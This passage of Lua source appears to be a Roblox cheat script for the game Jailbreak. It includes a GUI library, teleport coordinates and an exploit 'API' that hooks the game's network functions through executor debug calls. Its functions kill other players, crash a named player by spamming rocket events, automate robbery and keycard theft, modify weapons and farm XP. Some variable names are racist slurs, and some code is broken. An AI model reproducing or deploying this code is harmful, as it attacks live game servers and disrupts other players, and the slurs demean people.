					picking = true
					input.Changed:connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							picking = false
						end
					end)
					x, y, hue, sat = updateHueSat(input, HueSat, hue, sat)
					pointer.Position = UDim2.new(x,0,y,0)
					color = Color3.fromHSV(hue,sat,val)
					visualize.BackgroundColor3 = color
					return _function(color)
				end
			end)
			
			Value.InputBegan:connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					pickingVal = true
					input.Changed:connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							pickingVal = false
						end
					end)
					local y, val = updateValue(input, Value, val)
					pointer2.Position = UDim2.new(1,-10,y,0)
					color = Color3.fromHSV(hue,sat,val)
					visualize.BackgroundColor3 = color
					return _function(color)
				end
			end)
			
			UserInputService.InputChanged:connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					if picking then
						x, y, hue, sat = updateHueSat(input, HueSat, hue, sat)
						if x <= 0 then
							x = 0
							hue = 1
						end
						if x >= 1 then
							x = 1
							hue = 0
						end
						if y <= 0 then
							y = 0
							sat = 1
						end
						if y >= 1 then
							y = 1
							sat = 0
						end
						pointer.Position = UDim2.new(x,0,y,0)
						color = Color3.fromHSV(hue,sat,val)
						visualize.BackgroundColor3 = color
						return _function(color)
					end
					if pickingVal then
						y, val = updateValue(input, Value, val)
						if y <= 0 then
							y = 0
							val = 1
						end
						if y >= 1 then
							y = 1
							val = 0
						end
						pointer2.Position = UDim2.new(1,-10,y,0)
						color = Color3.fromHSV(hue,sat,val)
						visualize.BackgroundColor3 = color
						return _function(color)
					end
				end
			end)
			
			self.ysize = self.ysize+20
			tab.ysize = tab.ysize+20
			section.frame.Size = UDim2.new(0,200-16,0,self.ysize)
			
			return container
		end
		
		function section:AddKeybind(text, key, _function, hold, delayy, tooltip)
			local binding
			if hold then
				if typeof(hold) == "string" then
					tooltip = hold
					hold = false
				end
			end
			posSection(self)
			
			local button = ui:create("TextButton", {
				ZIndex = 23,
				Position = UDim2.new(0,2,0,self.ysize),
				Size = UDim2.new(1,-4,0,18),
				BackgroundTransparency = 1,
				BackgroundColor3 = _settings.buttonhigh,
				BorderSizePixel = 0,
				Text = " "..text,
				TextColor3 = _settings.text,
				Font = _settings.font,
				TextSize = 16,
				TextXAlignment = Enum.TextXAlignment.Left,
				AutoButtonColor = false,
				Parent = self.frame,
			})
			
			local label = ui:create("TextLabel", {
				ZIndex = 24,
				Position = UDim2.new(1,-2,0,2),
				Size = UDim2.new(0,-80,0,14),
				BackgroundColor3 = _settings.background,
				BorderColor3 = _settings.sectionoutline,
				Text = key.Name,
				TextColor3 = _settings.text,
				Parent = button,
			})
			
			addHighlight(button, 0.8, 1, tooltip)
			
			button.MouseButton1Click:connect(function()
				label.Text = "..."
				binding = true
			end)
			
			local holding
			local function holdKey()
				while holding do
					delayy = delayy or 0.03
					_function()
					wait(delayy)
				end
				return _function(true)
			end
			
			UserInputService.InputBegan:connect(function(input)
				if binding and ui.header.Visible then
					if input.KeyCode == Enum.KeyCode.Backspace then
						label.Text = key.Name
						binding = false
					else
						if not test(input.KeyCode, blacklistedKeys) then
							key = input.KeyCode
							label.Text = key.Name
							binding = false
						end
						if test(input.UserInputType, whitelistedMouse) then
							key = input.UserInputType
							label.Text = key.Name
							binding = false
						end
					end
				else
					if not ui.header.Visible then
						if input.KeyCode.Name == key.Name then
							holding = true
							if hold then
								holdKey()
							else
								_function()
							end
						end
						if input.UserInputType.Name == key.Name then
							holding = true
							if hold then
								holdKey()
							else
								_function()
							end
						end
					end
				end
			end)
			
			UserInputService.InputEnded:connect(function(input)
				if input.KeyCode.Name == key.Name then
					holding = false
				end
				if input.UserInputType.Name == key.Name then
					holding = false
				end
			end)
			
			self.ysize = self.ysize+20
			tab.ysize = tab.ysize+20
			section.frame.Size = UDim2.new(0,200-16,0,self.ysize)
			
			return button
		end
		
		tab.ysize = tab.ysize+20
		section.frame.Size = UDim2.new(0,200-16,0,10)
		return section
	end
	
	return tab
end

local function updateCursor(follow)
	if follow then
		game["Run Service"]:BindToRenderStep("library_cursor",1, function()
			local x = UserInputService:GetMouseLocation().X
			local y = UserInputService:GetMouseLocation().Y
			ui.cursor.Position = UDim2.new(0,x+1,0,y-35)
		end)
	else
		game["Run Service"]:UnbindFromRenderStep("library_cursor")
	end
end

spawn(function()
	repeat wait() until ui.cursor
	updateCursor(true)
end)

UserInputService.InputBegan:connect(function(input)
	if input.KeyCode == Enum.KeyCode.F8 then
		ui.header.Visible = not ui.header.Visible
		ui.cursor.Visible = not ui.cursor.Visible
		if ui.header.Visible then
			updateCursor(true)
		else
			updateCursor(false)
		end
	end
end)

UserInputService.InputChanged:connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
local locations = {
	Stores = {
	{'Jewelry Out', CFrame.new(156.103851, 18.540699, 1353.72388)},
	{'Jewelry In', CFrame.new(133.300705, 17.9375954, 1316.42407)},
	{'Bank Out', CFrame.new(11.6854906, 17.8929214, 788.188171)},
	{'Bank In', CFrame.new(24.6513691, 19.4347649, 853.291687)},
	{'Museum Out', CFrame.new(1103.53406, 138.152878, 1246.98511)},
	{'Museum In', CFrame.new(1071.72, 102.8, 1191.9)},
	{'Donut Shop', CFrame.new(270.763885, 18.4229183, -1762.90149)},
	{'Gas Station', CFrame.new(-1584.1051, 18.4732189, 721.38739)},
	},
	
	Locations = {
	{'Prison Cells', CFrame.new(-1461.07605, -0.318537951, -1824.14917)},
	{'Prison Yard', CFrame.new(-1219.36316, 17.7750931, -1760.8584)},
	{'Prison Sewer', CFrame.new(-1050.70667, 0.7002424, -1498.72766)},
	{'Prison Parking', CFrame.new(-1173.36951, 18.698061, -1533.47656)},
	{'Gun Shop', CFrame.new(-27.8670673, 17.7929249, -1774.66882)},
	{'1M Shop', CFrame.new(388.804688, 17.5929279, -1701.1698)},
	{'Volcano Base', CFrame.new(1726.72266, 50.4146309, -1745.76196)},
	{'City Base', CFrame.new(-244.824478, 17.8677788, 1573.81616)},
	{'Police HQ1', CFrame.new(-1134.69604, 17.9251575, -1586.79395)},
	{'Police HQ2', CFrame.new(738.103577, 38.1275024, 1134.48059)},
	{'Military Base', CFrame.new(766.283386, 18.0144463, -324.15921)},
	{'Evil Lair', CFrame.new(1735.52405, 18.1646328, -1726.05249)},
	{'Secret Agent Base', CFrame.new(1506.60754, 69.8824005, 1634.42456)},
	{'Garage', CFrame.new(-336.791779, 18.2407684, 1137.49451)},
	{'Glider Shop', CFrame.new(137.43399, 18.1547852, -1768.24658)},
	{'Factory', CFrame.new(691.559326, 37.6575089, 2362.05591)},
	{'Lookout', CFrame.new(1328.05725, 166.614426, 2609.93457)},
	{'Airport', CFrame.new(-1227.47449, 64.4552231, 2787.64233)},
	},
	
	Vehicles = {
	{'Prison Camaro', CFrame.new(-951.755493, 18.5451126, -1446.42664)},
	{'Lamborghini', CFrame.new(146.728821, 17.5929279, 774.655396)},
	{'Bugatti', CFrame.new(241.109451, 17.6066723, 1362.49316)},
	{'McLaren', CFrame.new(597.850708, 37.712925, 1649.81897)},
	{'Pickup Truck', CFrame.new(-1543.02686, 18.3732185, 721.518494)},
	{'Model3', CFrame.new(-117.721481, 17.5907402, 547.516052)},
	{'Mini Cooper', CFrame.new(760.116577, 17.8929214, -1228.13806)},
	{'Dirtbike', CFrame.new(1643.61707, 18.8864899, 233.026291)},
	{'SUV', CFrame.new(-1066.26172, 18.6751556, -1476.00732)},
	{'Dune Buggy', CFrame.new(580.013916, 17.1554928, -458.795807)},
	{'ATV', CFrame.new(-1452.651, 24.8182373, 202.176361)},
	{'Mustang', CFrame.new(-97.1472931, 18.2549458, -1724.10986)},
	{'Porsche', CFrame.new(1111.16809, 101.783577, 1296.94312)},
	{'Ambulance', CFrame.new(-139.396881, 18.1840897, 1098.80212)},
	{'UFO', CFrame.new(775.515747, 18.3745003, -142.552948)},
	{'SWAT Van', CFrame.new(-1356.85388, 17.9232101, -1534.93152)},
	{'Wraith', CFrame.new(1687.08911, 50.4146309, -1704.4657)},
	{'Ferrari', CFrame.new(-1500.52051, 49.4602127, 1804.38611)},
	{'Classic', CFrame.new(1194.28406, 106.283951, 1176.69458)},
	{'Audi R8', CFrame.new(1714.05151, 18.646801, -1691.49756)},
	{'Raptor', CFrame.new(1520.34692, 73.6122742, 1741.82507)},
	{'Police Motorcycle', CFrame.new(718.890076, 38.3909264, 1072.3656)},
	{'Firetruck', CFrame.new(-967.847168, 33.1665268, 1320.79968)},
	{'Jet Skis', CFrame.new(-505.554657, 18.6864834, 812.503174)},
	},
}
UserInputService.InputChanged:connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
local API = {}
do -- api
	local Remotes = {}
	local is
	do -- auto updater
		local ws = game:GetService("Workspace")
		local rs = game:GetService("ReplicatedStorage")
		local ps = game:GetService("Players")
		local p = ps.LocalPlayer
		local HttpService = game:GetService("HttpService")
		local Logic = require(rs.Module.Logic)
		local R15 = require(rs.Module.R15IKv2)
		local CUI = require(game:GetService("ReplicatedStorage").Module.UI).CircleAction.Specs
		local Inv = p.PlayerGui.MainGui.Inventory.Inner:GetChildren()[1]

		local ArtificialGunData = {
			["Shotgun"] = {AmmoCurrent = 5},
			["IK"] = R15.BuildPacketArms(p.Character),
			["AK47"] = {AmmoCurrent = 30},
			["i"] = Inv,
			["Character"] = p.Character,
			["VerticalAngle"] = 0,
			["HorizontalAngle"] = 0,
			["FireLast"] = 0,
			["BulletEmitter"] = {
				["RoughSurface"] = true,
				["ImpactFun"] = function() end,
				["IgnoreList"] = {}
				["WhizFun"] = function() end,
				["LastUpdate"] = 1566922878.5193,
				["GravityVector"] = Vector3.new(0, -196.199997, 0),
				["LifeSpan"] = 2,
			},
			["SpringRotation"] = {
				["p"] = Vector3.new(0, 0, 0),
				["t"] = 1566579652.6169,
				["Update"] = function() end,
				["SetTarget"] = function() end,
				["Damp"] = 0.85,
				["Target"] = Vector3.new(0, 0.785, 0),
				["Accelerate"] = function() end,
				["Freq"] = 20,
				["v"] = Vector3.new(0, 0, 0),
			},
			["Grenade"] = {AmmoCurrent = 5},
			["SpringOffset"] = {
				["p"] = Vector3.new(0, 0, 0),
				["t"] = 1566579652.6169,
				["Update"] = function() end,
				["SetTarget"] = function() end,
				["Damp"] = 0.85,
				["Target"] = Vector3.new(0, 0.785, 0),
				["Accelerate"] = function() end,
				["Freq"] = 20,
				["v"] = Vector3.new(0, 0, 0),
			},
			["Type"] = "RocketLauncher",
			["HasSWAT"] = false,
			["RocketLauncher"] = {AmmoCurrent = 10},
			["PlayerName"] = p.Name,
			["Motor"] = Instance.new("Motor"),
			["SendLast"] = 1566580433.0651,
			["Uzi"] = {AmmoCurrent = 15},
			["AmmoCurrent"] = 10,
			["Name"] = "RocketLauncher",
			["Local"] = true,
			["AmmoGui"] = {
				["Destroy"] = function() end,
				["SetName"] = function() end,
				["Float"] = function() end,
				["Update"] = function() end,
				["Gui"] = rs.Game.AmmoGui.AmmoGui,
			},
			["Frame"] = Inv,
			["Model"] = rs.Resource.ItemSystem.Models.RocketLauncher,
			["SpringMouse"] = {
				["p"] = Vector3.new(0, 0, 0),
				["t"] = 1566579652.6169,
				["Update"] = function() end,
				["SetTarget"] = function() end,
				["Damp"] = 0.85,
				["Target"] = Vector3.new(0, 0.785, 0),
				["Accelerate"] = function() end,
				["Freq"] = 20,
				["v"] = Vector3.new(0, 0, 0),
			},
		}

		local function rx (x)
			if typeof(x) == "function" then
				return debug.getupvalues(x)
			elseif typeof(x) == "table" then
				return x
			end
			return {}
		end

		local function indexTable (t)
			local newt = {}
			for i,v in next, t do
				table.insert(newt, v)
			end
			return newt
		end

		local function LoadGC (n,rc)
			for i1,v1 in next, getgc() do
				if tostring(i1) == n and rc then return getgc() elseif tostring(i1) == n then return v1 end
				for i2,v2 in next, rx(v1) do
					if tostring(i2) == n and rc then return v1 elseif tostring(i2) == n then return v2 end
					for i3,v3 in next, rx(v2) do
						if tostring(i3) == n and rc then return v2 elseif tostring(i3) == n then return v3 end
					end
				end
			end
		end

		local function LoadConstant (n)
			for i1,v1 in next, getgc() do
				if typeof(v1) == "function" then
					for i2, v2 in next, debug.getupvalues(v1) do
						if typeof(v2) == "function" and islclosure(v2) then
							for i3, v3 in next, debug.getconstants(v2) do
								if v3 == n then
									return v2
								end
							end
						end
					end
				end
			end
		end

		local function LoadGCIndex (n,rc)
			for i1,v1 in next, getgc() do
				for i2,v2 in next, rx(v1) do
					local X = rx(v2)
					for i3,v3 in next, X do
						if X[n] then
							if rc then
								return v2
							else
								return v3
							end
						end
					end
				end
			end
		end

		local function OverwriteConstant (func, n, new)
			local index
			for i,v in next, debug.getconstants(func) do
				if tostring(v) == tostring(n) then
					index = i
				end
			end
			debug.setconstant(func, index, new)
		end

		local Network = LoadGC("FireServer", true)
		local FS = Network.FireServer
		local Action = LoadConstant("Punch")
		local GiveNitro = indexTable(rx(LoadConstant("NitroLoop")))[1]

		local Bullets = require(rs.Game.Bullets)
		local Func = Bullets.DefaultImpactFun

		local ItemSystem = rs.Resource.ItemSystem
		local Register = LoadGCIndex("Equipped", true)
		local RL = indexTable(rx(Register.Register))[1].RocketLauncher
		local Basic = indexTable(rx(Register.Register))[1].Basic
		local Grenade = indexTable(rx(Register.Register))[1].Grenade
		local SpawnRocket = indexTable(rx(RL.Heartbeat))[1]
		local GreandeExplode = indexTable(rx(Grenade.InputBegan))[1]

		if not getgenv().OldFS then
			getgenv().OldFS = indexTable(rx(FS))[1]
		end


		local doCapture = false
		local remotename = ""
		local uname

		for i,v in next, rx(FS) do
			uname = i
		end

		debug.setupvalue(FS, uname, function (remote, ...)
			if doCapture then
				Remotes[remotename] = remote
			end
			if not doCapture then
				return OldFS(remote, ...)
			end
		end)
		local ProjectilesTemplate = {
			[1] = Vector3.new(0, 0, 0),
			[2] = Vector3.new(0, 0, 0),
			[3] = 100,
			[4] = rs.Resource.ItemSystem.Projectiles.Rocket:Clone(),
			[5] = 100
		}
		local function Capture (name, func)
			remotename = name
			doCapture = true
			pcall(func)
			doCapture = false
		end
		local function Punch ()
			OverwriteConstant(Action, "Play", "Stop")
			Action({Name = "Punch"}, true)
			OverwriteConstant(Action, "Stop", "Play")
		end

		local function FireRocket ()
			SpawnRocket({ProjectilesTemplate}, 0, true, p.Name)
		end
		getrenv().newdelay = function (d,func)
			pcall(func)
		end

		local function Heal ()
			local BasicData = {}
			BasicData.Name = "Donut"
			BasicData.Local = true
			BasicData.SpringOffset = {}
			BasicData.SpringOffset.SetTarget = function() end
			BasicData.SpringRotation = {}
			BasicData.SpringRotation.SetTarget = function() end
			BasicData.SpringOffsetOrigin = true
			BasicData.SpringRotationOrigin = true

			OverwriteConstant(Basic.InputBegan, "delay", "newdelay")
			Basic.InputBegan(BasicData, {UserInputType = Enum.UserInputType.MouseButton1})
			OverwriteConstant(Basic.InputBegan, "newdelay", "delay")
		end
		local function AddRocket() 
			local data = {}
			data.Model = {
				Skeleton = {
					Rocket = {
						Position = Vector3.new(0, 0, 0),
						CFrame = CFrame.new(0, 0, 0)
					}
				}
			}
			data.Projectiles = ProjectilesTemplate
			data.FireLast = 0
			data.AmmoCurrent = 1
			data.Local = true
			RL.InputBegan(data, {UserInputType = Enum.UserInputType.MouseButton1})
		end
		local function IsCop (plr)
			for i,v in next, game:GetService("Teams").Police:GetPlayers() do
				if v.Name == plr then
					return true
				end
			end
			return false
		end

		local function GetPickPocketFunction ()
			local Callback
			for i1,v1 in next, CUI do
				if v1.IsPlayer and v1.Part.Name == "UpperTorso" and IsCop(v1.Tag.Name) then
					Callback = v1.Callback
				end
			end

			local is
			for i1,v1 in next, rx(indexTable(rx(Callback))[3]) do
				if typeof(v1) == "function" then
					is = v1
				end
			end

			return is
		end

		local function Pick ()
			GetPickPocketFunction()(p)
		end
		local function Rob () 
			for i,v in next, CUI do 
				if v.Name then 
					if v.Name == "Rob" then
						v.Callback(v, true)
						break
					end
				end
			end
		end
		local function touchtrigger()
			local jetpack
			for i,v in next, debug.getupvalues(LoadConstant("Fun")) do 
				if typeof(v) == "table" then
					jetpack = v
					break
				end
			end
			for i,v in next, jetpack do 
				if v.Tag == nil and v.Part.Name == "JetPackGiver" then
					for i2,v2 in next, v do 
						if i2 == "Fun" then 
							jetpack = v2
						end
					end
					break
				end
			end
			jetpack()
		end
		local function UnlockNitro ()
			for i,v in next, rx(GiveNitro) do
				if v == false then
					local old = debug.getupvalue(GiveNitro, i)
					debug.setupvalue(GiveNitro, i, true)
					GiveNitro()
					debug.setupvalue(GiveNitro, i, old)
				end
			end
		end
		local function GetPistolImpact ()
			Bullets.DefaultImpactFun(ArtificialGunData, Vector3.new(0, 0, 0), Vector3.new(0, 0, 0), 1000, game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, Vector3.new(0, 0, 0), 15, Network)
		end
		local function GrenadeExplosion ()
			GreandeExplode(ArtificialGunData, rs.Resource.ItemSystem.Models.Grenade, Vector3.new(0, 0, 0))
		end

		local Paraglide = require(rs.Game.Paraglide)
		Capture("Punch", Punch)
		Capture("EnableParaglide", Paraglide.Parachute)
		Capture("DisableParaglide", Paraglide.ParachuteStop)
		Capture("InfNitro", UnlockNitro)
		Capture("SpawnFire", FireRocket)
		Capture("Heal", Heal)
		Capture("TouchTrigger", touchtrigger)
		Capture("RobSmallStore", Rob)
		Capture("Pick", Pick)
		Capture("ShootRocket", AddRocket)
		Capture("PistolImpact", GetPistolImpact)
		Capture("Explosion", GrenadeExplosion)
	end
	local client = {}
	client.remotes = Remotes
	client.ui = require(game:GetService("ReplicatedStorage").Module.UI).CircleAction.Specs
	local gameeditor = {}
	local UIS = game:GetService("UserInputService")
	function gameeditor:getgc(name)
		for i,v in next, getgc() do
			if typeof(v) == "function" and not is_synapse_function(v) then 
				for i2, v2 in next, debug.getupvalues(v) do 
					if typeof(v2) == "function" and islclosure(v2) then
						for i3, v3 in next, debug.getconstants(v2) do 
							if v3 == name then
								return v2 
							end
						end
					end
				end
			end
		end
	end
	function gameeditor:getgcindex(sd) 
		for i,v in next, getgc() do
			if typeof(v) == "function" and not is_synapse_function(v) then 
				for i2, v2 in next, debug.getupvalues(v) do 
					if typeof(v2) == "table" then 
						if v2[sd] then 
							return v2
						end
					end
				end
			end
		end
	end
	function gameeditor:getgctable(name)
		for i,v in next, getgc() do
			if typeof(v) == "table" and not is_synapse_function(v) then 
				local func = v[name]
				if func then 
					return func
				end
			end
		end
	end
	function gameeditor:replacefuncgc(name, newfunc)
		for i,v in next, getgc() do
			if typeof(v) == "function" and not is_synapse_function(v) then 
				for i2, v2 in next, debug.getupvalues(v) do 
					if typeof(v2) == "function" and islclosure(v2) then
						for i3, v3 in next, debug.getconstants(v2) do 
							if v3 == name then
								debug.setupvalue(v, i2, newfunc)
								break
							end
						end
					end
				end
			end
		end
	end
	function gameeditor:replacevaluegc(name, newvalue)
		for i,v in next, getgc() do
			if typeof(v) == "function" then 
				local value = debug.getupvalue(v, name)
				if value then 
					debug.setupvalue(v, name, newvalue)
				end
			end
		end
	end
	local serversidedfunctions = {}
	function serversidedfunctions:getfunc(const) 
		for i,v in next, getgc() do 
			if typeof(v) == "function" and not is_synapse_function(v) then
				for i2,v2 in next, debug.getupvalues(v) do 
					if typeof(v2) == "table" then 
						for i3, v3 in next, v2 do 
							if tostring(i3):len() == 8 then
								if typeof(v3) == "function" and islclosure(v3) then
									for i4, v4 in next, debug.getconstants(v3) do 
										if v4 == const then
											return v3;
										end;
									end;
								end;
							end;
						end;
					end;
				end;
			end;
		end;
	end;
	local function SetConstant(func, const, newvalue) 
		for i,v in next, debug.getconstants(func) do 
			if v == const then 
				debug.setconstant(func, i, newvalue)
			end
		end
	end
	function getplaysound() 
		local howmuch = 0
		local sound
		for i,v in next, debug.getupvalues(gameeditor:getgc("InjanHorn")) do 
			if typeof(v) == "function" then 
				howmuch = howmuch + 1
				if howmuch == 2 then 
					sound = v
					break
				end
			end
		end
		return sound
	end
	client.network = gameeditor:getgcindex("FireServer")
	client.punch = gameeditor:getgc("Punch")
	client.jetpack = {}
	client.firework = gameeditor:getgcindex("Fireworks").Fireworks
	client.playsound = getplaysound()
	client.toggles = {
		["Ragdoll Bypass"] = false,
		["Punch"] = false,
		["Hide Tp"] = false,
		["Spam Bypass"] = false,
		["Gun Mod"] = false,
		["Annoy"] = false,
		["Heal"] = false
	}
	client.backups = {}
	client.scriptname = getfenv().script.Name
	client.a = gameeditor:getgcindex("Register")
	client.idkbro = gameeditor:getgcindex("Adjust")
	print(client.remotes.Explosion)
	API.KillPlayer = function(d, ddd) 
		local player = API:GetPlayer(ddd)
		local function grenade(player2)
			client.toggles["Heal"] = true
			for i = 1, 100 do 
				pcall(function()
					client.network:FireServer(client.remotes.Explosion, player2.Character.HumanoidRootPart.Position, player2.Character.HumanoidRootPart.Position)
				end)
			end
			client.toggles["Heal"] = false
		end
		local function pistol(player2) 
			for i = 1, 100 do 
				pcall(function()
					client.network:FireServer(client.remotes.PistolImpact, "Pistol", player2.Character.HumanoidRootPart.Position, Vector3.new(0, 0, 0), player2.Character.Head)
				end)
			end
		end
		if player.Team.Name ~= game.Players.LocalPlayer.Team.Name then 
			if player.Team.Name ~= "Criminal" then 
				pistol(player)
			else
				grenade(player)
			end
		else
			grenade(player)
		end
	end
	function hint(text) 
		local hint = Instance.new("Hint")
		hint.Parent = game.CoreGui
		hint.Text = text
		wait(1)
		hint:Destroy()
	end
	local idkbroe = getrenv().settings()
	API.GetPlayer = function(d, name) 
		local player
		for i,v in next, game.Players:GetPlayers() do 
			if v.Name:find(name) then 
				player = v
			end
		end
		if player == nil then 
			hint("Player is incorrect")
			return wait(9e9)
		else
			return player
		end
	end
	local rs = game:GetService("ReplicatedStorage")
	local ps = game:GetService("Players")
	local p = ps.LocalPlayer
	local R15 = require(rs.Module.R15IKv2)
	local Inv = p.PlayerGui.MainGui.Inventory.Inner:GetChildren()[1]

	local ArtificialGunData = {
		["Shotgun"] = {AmmoCurrent = 5},
		["IK"] = R15.BuildPacketArms(p.Character),
		["AK47"] = {AmmoCurrent = 30},
		["i"] = Inv,
		["Character"] = p.Character,
		["VerticalAngle"] = 0,
		["HorizontalAngle"] = 0,
		["FireLast"] = 0,
		["SpringRotation"] = {
			["p"] = Vector3.new(0, 0, 0),
			["t"] = 1566579652.6169,
			["Update"] = function() end,
			["SetTarget"] = function() end,
			["Damp"] = 0.85,
			["Target"] = Vector3.new(0, 0.785, 0),
			["Accelerate"] = function() end,
			["Freq"] = 20,
			["v"] = Vector3.new(0, 0, 0),
		},
		["Grenade"] = {AmmoCurrent = 5},
		["SpringOffset"] = {
			["p"] = Vector3.new(0, 0, 0),
			["t"] = 1566579652.6169,
			["Update"] = function() end,
			["SetTarget"] = function() end,
			["Damp"] = 0.85,
			["Target"] = Vector3.new(0, 0.785, 0),
			["Accelerate"] = function() end,
			["Freq"] = 20,
			["v"] = Vector3.new(0, 0, 0),
		},
		["Type"] = "RocketLauncher",
		["HasSWAT"] = false,
		["RocketLauncher"] = {AmmoCurrent = 10},
		["PlayerName"] = p.Name,
		["Motor"] = Instance.new("Motor"),
		["SendLast"] = 1566580433.0651,
		["Uzi"] = {AmmoCurrent = 15},
		["AmmoCurrent"] = 10,
		["Name"] = "RocketLauncher",
		["Local"] = true,
		["AmmoGui"] = {
			["Destroy"] = function() end,
			["SetName"] = function() end,
			["Float"] = function() end,
			["Update"] = function() end,
			["Gui"] = rs.Game.AmmoGui.AmmoGui,
		},
		["Frame"] = Inv,
		["Model"] = rs.Resource.ItemSystem.Models.RocketLauncher,
		["SpringMouse"] = {
			["p"] = Vector3.new(0, 0, 0),
			["t"] = 1566579652.6169,
			["Update"] = function() end,
			["SetTarget"] = function() end,
			["Damp"] = 0.85,
			["Target"] = Vector3.new(0, 0.785, 0),
			["Accelerate"] = function() end,
			["Freq"] = 20,
			["v"] = Vector3.new(0, 0, 0),
		},
	}
	client.hasrocketlauncher = false
	client.gun = gameeditor:getgcindex("Pistol")
	client.breakcrash = false
	API.CrashPlayer = function(self, name) 
		local player = self:GetPlayer(name)
		is.Equip(ArtificialGunData)
		spawn(function() 
			while wait() do 
				if client.breaskcrash then break end
				for i = 1, 25 do
					client.network:FireServer(client.remotes.ShootRocket, player.Character.PrimaryPart.Position, player.Character.PrimaryPart.CFrame.LookVector, 1)
				end
			end
		end)
	end
	API.GiveCash = function(d, num) 
		serversidedfunctions:getfunc("PlusCash")(num, "You really thought it works")
	end
	API.NoWait = function() 
		for i, v in next, client.ui do 
			if v.Timed then 
				v.Duration = 0
			end
		end
	end
	API.RobSmallStore = function() 
		for i,v in next, client.ui do 
			if v.IsRob then 
				client.network:FireServer(client.remotes.RobSmallStore, v.Part)
			end
		end
	end
	API.Teleport = function(d, pos)
		client.network:FireServer(client.remotes.EnableParaglide)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
		client.network:FireServer(client.remotes.DisableParaglide)
	end
	API.Teleport2 = function(e, pos) 
		client.network:FireServer("egvviv3z")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
		wait(0.30)
		client.network:FireServer("n6yy8hqo")
	end
	API.TpToPlayer = function(d, name) 
		d:Teleport(d:GetPlayer(name).Character.HumanoidRootPart.CFrame)
	end
	for i,v in next, debug.getupvalues(require(game.ReplicatedStorage.Game.JetPack.JetPack).Init) do 
		if typeof(v) == "table" then 
			if v.Equip then 
				client.jetpack = v
				break
			end
		end
	end
	API.Heal = function() 
		for i = 1, 14 do 
			client.network:FireServer(client.remotes.Heal)
		end
	end
	API.SpawnFire = function(aztupbruhmoment, pos) 
		client.network:FireServer(client.remotes.SpawnFire, pos, "RocketLauncher")
	end
	spawn(function() 
		while game.RunService.Heartbeat:Wait() do 
			if client.toggles["Hide Tp"] then 
				pcall(function() 
					game.Players.LocalPlayer.Character.Parachute:Destroy()
				end)
			end
		end
	end)
	client.backups.ragdoll = gameeditor:getgc("PlatformStand")
	gameeditor:replacefuncgc("PlatformStand", function(...) 
		if client.toggles["Ragdoll Bypass"] then 
			return
		end
		return client.backups.ragdoll(...)
	end)

	API.ToggleRagdollBypass = function() 
		if not client.toggles["Ragdoll Bypass"] then
			client.toggles["Ragdoll Bypass"] = true
		else
			client.toggles["Ragdoll Bypass"] = false
		end
	end
	API.Punch = function() 
		client.toggles["Punch"] = true
		SetConstant(client.punch, 0.5, 0)
		client.punch({Name = "Punch"}, true)
		client.toggles["Punch"] = false
		SetConstant(client.punch, 0, 0.5)
	end
	API.GetJetPack = function() 
		client.network:FireServer(client.remotes.TouchTrigger, "JetPackGiver")
	end
	API.InfFuel = function() 
		client.jetpack.LocalMaxFuel = math.huge
		client.jetpack.LocalFuel = math.huge
		client.jetpack.LocalFuelType = "Rocket"
	end
	API.GrabKeyCard = function(d) 
		if game.Players.LocalPlayer.Team == game.Teams.Police then hint("You need to a prisoner to do it") return end
		local breakloop = false
		function nword(f) 
			spawn(function() 
				while game.RunService.Heartbeat:Wait() do
					if breakloop then break end
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = f.Character.HumanoidRootPart.CFrame
				end
			end)
		end
		local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		for i,v in next, game:GetService('Players'):GetPlayers() do
			if v.Team.Name == "Police" then 
				d:Teleport(v.Character.HumanoidRootPart.CFrame)
				wait(0.30)
				nword(v)
				for i = 1, 10 do
					client.network:FireServer(client.remotes.Pick, v.Name)
				end
				breakloop = true
				d:Teleport(oldpos)
				break
			end
		end
	end
	API.MobileGarage = function() 
		local e = gameeditor:getgcindex("GetLocalVehiclePacket").GetLocalVehiclePacket()
		if e then
			if e.Passanger then return end
			serversidedfunctions:getfunc("SpawnUI")({CustomizeUI = true})
		else
			serversidedfunctions:getfunc("SpawnUI")({SpawnUI = true})
		end
	end
	API.InfNitroServerSide = function() 
		local e = gameeditor:getgcindex("GetLocalVehiclePacket").GetLocalVehiclePacket()
		if e then
			if e.Passanger then return end
			client.network:FireServer(client.remotes.InfNitro, -math.huge)
		end
	end
	API.Firework = function()
		client.firework(400)
	end
	API.XpFarm = function(self) 
		coroutine.resume(coroutine.create(function() 
			while wait(0.40) do 
				pcall(function()
					for i,v in next, game.Players:GetPlayers() do 
						if v.Name ~= game.Players.LocalPlayer.Name and v.Team.Name == "Police" then 
							self:KillPlayer(v.Name)
						end
					end
				end)
			end
		end))
	end
	for i,v in next, debug.getupvalues(client.network.FireServer) do 
		funcname = i
		backup = v
		break
	end
	API.equiptest = function() 
		client.network:FireServer(client.remotes.Equip, ArtificialGunData)
	end
	spawn(function()
		while wait() do
			if client.toggles["Gun Mod"] then
				local gun = client.gun
				for i,v in next, gun do 
					if gun[i]["MagSize"] then 
						gun[i]["MagSize"] = math.huge
						gun[i]["FireAuto"] = true
						gun[i]["FireFreq"] = 100
						gun[i]["CamShakeMagnitude"] = 0
					end
				end
			end
		end
	end)
	for i,v in next, debug.getupvalues(client.a.Register) do 
		client.rocketlanucher = v.RocketLauncher
		break
	end
	for i,v in next, debug.getupvalues(client.rocketlanucher.InputBegan) do 
		if typeof(v) == "table" then
			if v.Accelerate then 
				client.nobro = v
			end 
		end 
	end
	local nah1 = client.idkbro.Update 
	local nah2 = client.idkbro.Adjust
	client.idkbro.Update = function(...) 
		if not client.toggles["Gun Mod"] then 
			return nah1(...)
		end
	end
	client.idkbro.Adjust = function(...) 
		if not client.toggles["Gun Mod"] then 
			return nah2(...)
		end
	end
	local sdsgdshbackup = client.nobro.Accelerate
	client.nobro.Accelerate = function(...) if not client.toggles["Gun Mod"] then return sdsgdshbackup(...) end end
	local oldnigger = client.rocketlanucher.InputBegan
	local oldnigger3 = client.rocketlanucher.Equip
	local nugger1
	local toloop = false
